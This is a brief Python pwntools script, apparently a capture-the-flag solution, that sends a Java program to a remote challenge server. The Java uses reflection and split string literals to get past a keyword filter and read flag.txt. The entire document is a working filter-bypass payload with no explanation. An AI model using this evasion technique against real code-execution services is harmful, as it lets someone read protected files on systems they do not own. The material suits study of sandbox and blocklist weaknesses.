from pwn import *
nc = remote('chal.amt.rs', 2104)

code = """
class Main {
  public static void main(String... args) {
    try {
      System.out.println(String.class.getClass().forName("java.nio.file.F"+"iles").getMethod("readAllLines", java.nio.file.Path.class).invoke(
        null, String.class.getClass().forName("java.nio.file.Paths").getMethod("get", String.class, args.getClass()).invoke(null, "fl"+"ag.txt", args)));
    } catch (Exception e) {
        e.printStackTrace();
    }
  }
}
"""
payload = code + "\n--EOF--"
print(payload)
output = nc.recvuntil("--EOF--\n").decode()
nc.sendline(payload.encode())
nc.interactive()
